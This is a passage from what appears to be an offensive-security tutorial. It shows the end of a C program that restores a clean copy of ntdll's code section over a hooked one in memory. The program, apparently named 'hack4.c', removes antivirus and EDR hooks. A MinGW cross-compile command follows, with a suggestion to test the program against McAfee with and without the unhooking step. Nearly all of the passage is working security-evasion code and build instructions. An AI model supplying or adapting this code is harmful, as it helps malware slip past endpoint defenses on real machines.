      memcpy(lpStartingPageAddress, (LPVOID)((DWORD_PTR)lpNtdllMappingAddress + (DWORD_PTR)pHookedSectionHeader->VirtualAddress), pHookedSectionHeader->Misc.VirtualSize);

      // restore the original protection of the memory region
      bIsProtected = VirtualProtect(lpStartingPageAddress, dwSizeOfTheRegion, dwOldProtection, &dwOldProtection);
    }
  }

  // cleanup
  CloseHandle(hProcess);
  CloseHandle(hNtdllFile);
  CloseHandle(hNtdllMapping);
  FreeLibrary(hNtdllModule);

  return 0;
}
```

##### Compile with :

```bash 
x86_64-w64-mingw32-g++ -O2 hack4.c -o hack4.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -w
```

We could install McAfee and try with and without unhooking part.
